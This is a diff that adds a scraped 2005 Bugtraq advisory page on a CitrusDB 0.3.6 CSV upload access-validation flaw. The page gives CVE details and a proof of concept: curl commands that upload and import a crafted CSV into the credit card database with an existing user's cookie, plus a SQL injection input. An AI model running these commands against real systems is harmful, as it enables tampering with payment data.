@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid12557<p><b><span style="font-size: 18pt;">CitrusDB CSV File Upload Access Validation Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/12557/info">info</a><br><a href="http://www.securityfocus.com/bid/12557/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/12557/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/12557/solution">solution</a><br><a href="http://www.securityfocus.com/bid/12557/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				12557
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2005-0409<br/>
+				
+					CVE-2005-0410<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 15 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2009 10:06AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this vulnerability is credited to RedTeam.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					CitrusDB Customer Database 0.3.6 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following proof of concept is available:<br/>This uploads the file exploit.csv.<br/><br/>curl -D - --cookie "id_hash=2378c7b70e77d9c6737d697a46cbe34b;<br/>user_name=testor" http://&amp;lt;target&amp;gt;/citrusdb/tools/uploadcc.php --form<br/>userfile=@exploit.csv --form Import=Import<br/><br/>This imports the file to the credit card database:<br/><br/>curl -D - --cookie "id_hash=2378c7b70e77d9c6737d697a46cbe34b;<br/>user_name=testor"<br/>"http://&amp;lt;target&amp;gt;/citrusdb/tools/index.php?load=importcc&amp;amp;submit=on"<br/><br/>Note: The above proof of concepts require the id_hash of an existing user.<br/><br/>THe following proof of concept demonstrates the SQL injection vulnerability:<br/>Reportedly supplying ',,,,, as the contents of the uploaded csv file will make the SQL query in './citrusdb/tools/importcc.php' fail.
+	
+		<ul>
+</ul>
+</div>
